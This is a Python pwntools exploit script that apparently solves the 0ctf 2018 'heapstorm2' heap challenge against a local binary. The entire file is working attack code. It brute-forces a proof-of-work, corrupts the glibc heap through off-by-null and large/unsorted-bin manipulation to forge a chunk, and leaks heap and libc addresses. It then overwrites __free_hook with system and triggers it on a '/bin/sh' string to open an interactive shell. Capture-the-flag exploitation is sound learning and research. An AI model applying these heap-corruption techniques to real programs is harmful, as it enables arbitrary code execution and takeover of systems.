from pwn import *
import itertools
from hashlib import sha256
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_19_0ctf_2018_heapstorm2')
libc = elf.libc
p = None
storage = 0x13370000 + 0x800

def proof():
    chal = p.recvuntil(b'\n').strip()
    print(chal)
    for x in itertools.product(range(0, 0xff), repeat=4):
        x = bytes(x) 
        if sha256(chal+x).digest().startswith(b'\0\0\0'):
            p.send(x)
            return
    print('Not Found')
    exit()

def alloc(size):
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    assert(12 < size <= 0x1000)
    p.sendline(str(size).encode())
    p.recvuntil(b'Command: ')

def update(idx, content):
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(len(content)).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    p.recvuntil(b'Command: ')

def free(idx):
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Command: ')

def view(idx):
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    m = p.recvuntil(b'Command: ')
    pos1 = m.find(b']: ') + len(b']: ')
    pos2 = m.find(b'\n1. ')
    return m[pos1:pos2]

def heap_fengshui():
    global p
    while True:
        p = process('./data/bin/heap23_19_0ctf_2018_heapstorm2')
        proof()
        p.sendline(b'1')
        p.recvuntil(b'Command: ')
        # step.1
        alloc(0x18)
        alloc(0x508)
        alloc(0x18)
        update(1, b'h'*0x4f0 + p64(0x500))
        alloc(0x18)
        alloc(0x508)
        alloc(0x18)
        update(4, b'h'*0x4f0 + p64(0x500))
        # step.2
        alloc(0x18)
        free(1)
        update(0, b'h'*(0x18-12))
        alloc(0x18)
        alloc(0x4d8)
        # step.3
        free(1)
        # step.4
        free(2)        
        alloc(0x38)
        alloc(0x4e8)
        free(4)
        # step.5
        update(3, b'h'*(0x18-12))
        alloc(0x18)
        alloc(0x4d8)
        free(4)
        free(5)
        alloc(0x48)
        # step.6
        free(2)
        alloc(0x4e8)
        free(2)
        # step.7
        fake_chunk = storage - 0x20
        p1 = p64(0)*2 + p64(0) + p64(0x4f1)
        p1 += p64(0) + p64(fake_chunk)
        update(7, p1)
        # step.8
        p2 = p64(0)*4 + p64(0) + p64(0x4e1)
        p2 += p64(0) + p64(fake_chunk+8)
        p2 += p64(0) + p64(fake_chunk-0x18-5)
        update(8, p2)
        try:
            alloc(0x48)
            return p
        except EOFError:
            p.close()
            log.info('crash!')
            continue

p = heap_fengshui()
st = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage);update(2, st)#step.9
st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8);update(0, st)#step.10
leak = view(1);heap = u64(leak)
st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8);update(0, st)#step.11
leak = view(1);unsorted_bin = u64(leak);main_arena = unsorted_bin - 0x58;libc_base = main_arena - 0x3c4b20;libc_system = libc_base + libc.sym['system'];free_hook = libc_base + libc.sym['__free_hook']#step.12
st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + b'/bin/sh\0';update(0, st)#step.13
update(1, p64(libc_system))#step.14
p.sendline(b'3');p.recvuntil(b'Index: ');p.sendline(str(2).encode())#step.15
p.interactive()